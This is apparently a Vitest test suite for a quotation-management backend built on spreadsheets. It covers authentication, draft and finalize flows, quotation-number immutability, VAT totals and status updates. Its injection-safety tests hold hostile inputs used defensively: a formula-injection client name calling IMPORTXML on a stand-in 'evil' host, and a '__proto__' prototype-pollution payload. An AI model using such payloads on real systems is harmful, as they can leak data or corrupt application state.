import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';
import { installGasFakes, type GasEnvironment } from '../__fixtures__/gas-fakes';
import { handlePost } from '../main';
import { createPasswordRecord } from '../auth/password';
import { createUser } from '../sheets/users-repository';
import { QUOTATION_RECORDS_SHEET_NAME } from '../sheets/quotation-records-sheet';
import { readLastSequence } from '../sheets/counters-sheet';

const PEPPER = 'test-only-pepper-not-a-real-key';
const PASSWORD = 'TEST_ONLY_correct-horse-battery';

interface Envelope {
  ok: boolean;
  data?: unknown;
  error?: { code: string; message: string; fields?: Record<string, string> };
}

let env: GasEnvironment;
let token: string;

function postRaw(body: string): Envelope {
  const output = handlePost(body) as unknown as { getContent: () => string };
  return JSON.parse(output.getContent()) as Envelope;
}

function call(action: string, payload: unknown = {}): Envelope {
  return postRaw(JSON.stringify({ action, requestId: 'test-request', payload, token }));
}

/**
 * Send a request with no token at all.
 *
 * A separate function rather than `call(action, payload, undefined)`: passing
 * `undefined` to a parameter with a default re-applies the default, which
 * silently sent a VALID token and made the "unauthenticated" tests vacuous.
 */
function callAnonymous(action: string, payload: unknown = {}): Envelope {
  return postRaw(JSON.stringify({ action, requestId: 'test-request', payload }));
}

/** A complete, valid quotation. Obviously synthetic — never production data. */
function validQuotation(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    draftId: 'draft-0001',
    quotationDate: '2026-08-11',
    quotationFor: 'TEST_ONLY manpower supply',
    pricingMode: 'amount',
    status: 'Pending',
    client: {
      clientName: 'TEST_ONLY Contact',
      companyName: 'TEST_ONLY Client Co.',
      address: 'TEST_ONLY Address, Riyadh',
    },
    lines: [{ category: 'Manpower', quantity: 40_000, unitPrice: 2000 }],
    ...overrides,
  };
}

beforeEach(() => {
  env = installGasFakes(vi.stubGlobal);

  const material = createPasswordRecord(PASSWORD, PEPPER, 1_000);
  createUser({
    email: 'staff@speedxksa.com',
    passwordHash: material.hash,
    salt: material.salt,
    iterations: material.iterations,
    role: 'User',
  });

  const login = callAnonymous('auth.login', {
    email: 'staff@speedxksa.com',
    password: PASSWORD,
  });
  token = (login.data as { token: string }).token;
});

afterEach(() => {
  vi.unstubAllGlobals();
});

/* -------------------------------------------------------------------------- */

describe('authorization', () => {
  it('refuses every quotation action without a session', () => {
    for (const action of [
      'quotation.reserveNumber',
      'quotation.save',
      'quotation.get',
      'quotation.list',
      'quotation.updateStatus',
    ]) {
      expect(callAnonymous(action).error?.code, action).toBe('AUTH_REQUIRED');
    }
  });
});

/* -------------------------------------------------------------------------- */

describe('draft save', () => {
  it('stores a draft without issuing a quotation number', () => {
    const response = call('quotation.save', { quotation: validQuotation(), finalize: false });

    expect(response.ok).toBe(true);
    expect((response.data as { quotationNumber: string }).quotationNumber).toBe('');
    expect(readLastSequence(2026)).toBe(0);
  });

  it('accepts an incomplete draft', () => {
    const response = call('quotation.save', {
      quotation: validQuotation({ quotationFor: '', client: {}, lines: [] }),
      finalize: false,
    });

    expect(response.ok).toBe(true);
  });

  it('updates the same row rather than appending a second one', () => {
    call('quotation.save', { quotation: validQuotation(), finalize: false });
    call('quotation.save', {
      quotation: validQuotation({ quotationFor: 'TEST_ONLY revised' }),
      finalize: false,
    });

    expect(env.spreadsheet.dataRows(QUOTATION_RECORDS_SHEET_NAME)).toHaveLength(1);
  });
});

/* -------------------------------------------------------------------------- */

describe('finalize', () => {
  it('issues the quotation number on finalize', () => {
    const response = call('quotation.save', { quotation: validQuotation(), finalize: true });

    expect(response.ok).toBe(true);
    expect((response.data as { quotationNumber: string }).quotationNumber).toBe(
      'SFC/RUH/QTN/2026/001',
    );
  });

  it('promotes an existing draft in place, keeping one row', () => {
    call('quotation.save', { quotation: validQuotation(), finalize: false });
    const finalized = call('quotation.save', { quotation: validQuotation(), finalize: true });

    expect((finalized.data as { quotationNumber: string }).quotationNumber).toBe(
      'SFC/RUH/QTN/2026/001',
    );
    expect(env.spreadsheet.dataRows(QUOTATION_RECORDS_SHEET_NAME)).toHaveLength(1);
  });

  it('rejects an incomplete quotation', () => {
    const response = call('quotation.save', {
      quotation: validQuotation({ quotationFor: '', lines: [] }),
      finalize: true,
    });

    expect(response.error?.code).toBe('VALIDATION_FAILED');
    expect(Object.keys(response.error?.fields ?? {})).toContain('quotationFor');
    expect(Object.keys(response.error?.fields ?? {})).toContain('lines');
  });

  it('requires client name, company name and address', () => {
    const response = call('quotation.save', {
      quotation: validQuotation({ client: { clientName: '', companyName: '', address: '' } }),
      finalize: true,
    });

    const fields = Object.keys(response.error?.fields ?? {});
    expect(fields).toContain('client.clientName');
    expect(fields).toContain('client.companyName');
    expect(fields).toContain('client.address');
  });

  it('does not consume a number when validation fails', () => {
    call('quotation.save', { quotation: validQuotation({ quotationFor: '' }), finalize: true });
    expect(readLastSequence(2026)).toBe(0);
  });
});

/* -------------------------------------------------------------------------- */

describe('number immutability', () => {
  it('keeps the number when an issued quotation is edited', () => {
    call('quotation.save', { quotation: validQuotation(), finalize: true });

    const edited = call('quotation.save', {
      quotation: validQuotation({
        quotationFor: 'TEST_ONLY revised scope',
        quotationNumber: 'SFC/RUH/QTN/2026/001',
      }),
      finalize: true,
    });

    expect((edited.data as { quotationNumber: string }).quotationNumber).toBe(
      'SFC/RUH/QTN/2026/001',
    );
    // Editing must not burn the next number.
    expect(readLastSequence(2026)).toBe(1);
  });

  it('rejects a client that submits a different number', () => {
    call('quotation.save', { quotation: validQuotation(), finalize: true });

    const response = call('quotation.save', {
      quotation: validQuotation({ quotationNumber: 'SFC/RUH/QTN/2026/999' }),
      finalize: true,
    });

    expect(response.error?.code).toBe('QUOTATION_NUMBER_IMMUTABLE');
  });

  it('keeps the original number when the date is changed after issue', () => {
    call('quotation.save', { quotation: validQuotation(), finalize: true });

    const edited = call('quotation.save', {
      quotation: validQuotation({ quotationDate: '2027-03-03' }),
      finalize: true,
    });

    expect((edited.data as { quotationNumber: string }).quotationNumber).toBe(
      'SFC/RUH/QTN/2026/001',
    );
  });

  it('gives separate quotations separate numbers', () => {
    const first = call('quotation.save', { quotation: validQuotation(), finalize: true });
    const second = call('quotation.save', {
      quotation: validQuotation({ draftId: 'draft-0002' }),
      finalize: true,
    });

    expect((first.data as { quotationNumber: string }).quotationNumber).toBe(
      'SFC/RUH/QTN/2026/001',
    );
    expect((second.data as { quotationNumber: string }).quotationNumber).toBe(
      'SFC/RUH/QTN/2026/002',
    );
  });
});

/* -------------------------------------------------------------------------- */

describe('totals', () => {
  it('recomputes totals server-side', () => {
    call('quotation.save', { quotation: validQuotation(), finalize: true });

    const stored = call('quotation.get', { draftId: 'draft-0001' });
    const quotation = (stored.data as { quotation: { totals: { grandTotal: number } } }).quotation;

    // 40 x SAR 20.00 = SAR 800.00, plus 15% VAT = SAR 920.00
    expect(quotation.totals.grandTotal).toBe(920_00);
  });

  it('rejects a payload whose totals disagree with the server', () => {
    const response = call('quotation.save', {
      quotation: validQuotation({
        totals: {
          categorySubtotals: { Manpower: 1 },
          subtotal: 1,
          discountAmount: 0,
          taxableBase: 1,
          vatRateBasisPoints: 1500,
          vatAmount: 0,
          grandTotal: 1,
        },
      }),
      finalize: true,
    });

    expect(response.error?.code).toBe('TOTALS_MISMATCH');
  });

  it('rejects a negative price and a zero quantity', () => {
    const negative = call('quotation.save', {
      quotation: validQuotation({
        lines: [{ category: 'Manpower', quantity: 1000, unitPrice: -1 }],
      }),
      finalize: true,
    });
    expect(negative.error?.code).toBe('VALIDATION_FAILED');

    const zero = call('quotation.save', {
      quotation: validQuotation({ lines: [{ category: 'Manpower', quantity: 0, unitPrice: 100 }] }),
      finalize: true,
    });
    expect(zero.error?.code).toBe('VALIDATION_FAILED');
  });
});

/* -------------------------------------------------------------------------- */

describe('read and status', () => {
  beforeEach(() => {
    call('quotation.save', { quotation: validQuotation(), finalize: true });
  });

  it('reads a quotation back by draft id', () => {
    const response = call('quotation.get', { draftId: 'draft-0001' });
    const quotation = (response.data as { quotation: { quotationFor: string } }).quotation;

    expect(quotation.quotationFor).toBe('TEST_ONLY manpower supply');
  });

  it('reads a quotation back by number', () => {
    const response = call('quotation.get', { quotationNumber: 'SFC/RUH/QTN/2026/001' });
    expect(response.ok).toBe(true);
  });

  it('reports a missing quotation clearly', () => {
    expect(call('quotation.get', { draftId: 'nope' }).error?.code).toBe('VALIDATION_FAILED');
  });

  it('lists quotations with a summary', () => {
    const response = call('quotation.list');
    const rows = response.data as Array<{ quotationNumber: string; status: string }>;

    expect(rows).toHaveLength(1);
    expect(rows[0]?.quotationNumber).toBe('SFC/RUH/QTN/2026/001');
    expect(rows[0]?.status).toBe('Pending');
  });

  it('defaults a new quotation to Pending', () => {
    const rows = call('quotation.list').data as Array<{ status: string }>;
    expect(rows[0]?.status).toBe('Pending');
  });

  it('changes status', () => {
    const response = call('quotation.updateStatus', {
      quotationNumber: 'SFC/RUH/QTN/2026/001',
      status: 'Approved',
    });

    expect(response.ok).toBe(true);
    expect((call('quotation.list').data as Array<{ status: string }>)[0]?.status).toBe('Approved');
  });

  it('rejects an unknown status', () => {
    const response = call('quotation.updateStatus', {
      quotationNumber: 'SFC/RUH/QTN/2026/001',
      status: 'Maybe',
    });

    expect(response.error?.code).toBe('VALIDATION_FAILED');
  });

  it('preserves an Approved status when the quotation is re-saved', () => {
    // A document re-save must never quietly reset an approval (§17.2).
    call('quotation.updateStatus', {
      quotationNumber: 'SFC/RUH/QTN/2026/001',
      status: 'Approved',
    });
    call('quotation.save', { quotation: validQuotation(), finalize: true });

    expect((call('quotation.list').data as Array<{ status: string }>)[0]?.status).toBe('Approved');
  });
});

/* -------------------------------------------------------------------------- */

describe('injection and payload safety', () => {
  it('never writes a cell that Sheets would evaluate as a formula', () => {
    /*
     * The invariant that matters: no CELL may begin with = + - or @.
     *
     * Here the hostile client name is nested inside the JSON payload cell,
     * which begins with '{' and is therefore inert. Phase 11 puts the client
     * name in a cell of its own, where the escaping in sheet-access does the
     * work; this test guards the rule at the storage layer for both.
     */
    call('quotation.save', {
      quotation: validQuotation({
        client: {
          clientName: '=IMPORTXML("http://evil","//x")',
          companyName: '+TEST_ONLY Co.',
          address: '@TEST_ONLY Address',
        },
      }),
      finalize: false,
    });

    for (const row of env.spreadsheet.dataRows(QUOTATION_RECORDS_SHEET_NAME)) {
      for (const cell of row) {
        if (typeof cell !== 'string') continue;
        expect(['=', '+', '-', '@']).not.toContain(cell.charAt(0));
      }
    }
  });

  it('rejects a prototype-pollution key', () => {
    /*
     * `__proto__` in an object literal sets the prototype rather than creating
     * an own property, and JSON.stringify drops it — so it has to be injected
     * as raw JSON, which is exactly how a real attacker would send it.
     * JSON.parse DOES create it as an own property.
     */
    const quotation = JSON.stringify(validQuotation()).replace(
      /^\{/,
      '{"__proto__":{"polluted":true},',
    );

    const response = postRaw(
      `{"action":"quotation.save","requestId":"test-request","token":${JSON.stringify(token)},"payload":{"quotation":${quotation},"finalize":false}}`,
    );

    expect(response.ok).toBe(false);
    expect(response.error?.code).toBe('VALIDATION_FAILED');
    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined();
  });

  it('refuses more items than the ceiling allows', () => {
    const lines = Array.from({ length: 501 }, () => ({
      category: 'Manpower',
      quantity: 1000,
      unitPrice: 100,
    }));

    const response = call('quotation.save', {
      quotation: validQuotation({ lines }),
      finalize: true,
    });
    expect(response.error?.code).toBe('VALIDATION_FAILED');
  });
});
